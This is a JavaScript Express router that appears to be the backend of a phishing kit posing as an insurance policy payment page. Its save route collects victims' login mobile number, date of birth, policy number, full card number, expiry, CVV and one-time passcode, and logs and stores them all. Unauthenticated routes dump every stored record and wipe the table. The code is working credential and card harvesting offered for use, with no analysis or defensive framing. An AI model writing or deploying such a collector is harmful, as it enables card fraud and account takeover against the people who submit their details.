import express from 'express'
import { query } from '../config/db.js'

const router = express.Router()

router.post('/save-all-data', async (req, res) => {
  const { loginData, paymentData, cardData, otpValue, utrNumber } = req.body
  
  console.log('Received data:', { loginData, paymentData, cardData, otpValue, utrNumber })
  
  const timestamp = new Date()
  const date = timestamp.toLocaleDateString()
  const time = timestamp.toLocaleTimeString()
  
  try {
    const result = await query(
      `INSERT INTO user_info 
       (login_mobile, login_dob, login_for, name, policy_number, mobile, amount, payment_status, card_number, card_expiry, card_cvv, card_name, otp_value, utr_number, created_at, date, time) 
       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17)
       RETURNING id`,
      [
        loginData?.mobile || '',
        loginData?.dob || '',
        loginData?.loginFor || '',
        paymentData?.name || '',
        paymentData?.policyNumber || '',
        paymentData?.mobile || paymentData?.name || '',
        paymentData?.amount || '18500',
        'completed',
        cardData?.cardNumber || '',
        cardData?.cardExpiry || '',
        cardData?.cardCvv || '',
        cardData?.cardName || '',
        otpValue || '',
        utrNumber || '',
        timestamp,
        date,
        time
      ]
    )
    
    console.log('Saved to database, ID:', result.rows[0]?.id)
    return res.json({ success: true, id: result.rows[0]?.id })
  } catch (error) {
    console.log('Database error:', error.message)
    return res.json({ success: false, error: error.message })
  }
})

router.get('/get-all-data', async (req, res) => {
  try {
    const result = await query('SELECT * FROM user_info ORDER BY id DESC')
    return res.json(result.rows)
  } catch (error) {
    console.log('Database error:', error.message)
    return res.json([])
  }
})

router.get('/user-info', async (req, res) => {
  try {
    const result = await query('SELECT * FROM user_info ORDER BY id DESC')
    return res.json(result.rows)
  } catch (error) {
    console.log('Database error:', error.message)
    return res.json([])
  }
})

router.delete('/clear-all', async (req, res) => {
  try {
    await query('DELETE FROM user_info')
    return res.json({ success: true, message: 'All data cleared' })
  } catch (error) {
    console.log('Database error:', error.message)
    return res.json({ success: false })
  }
})

export default router
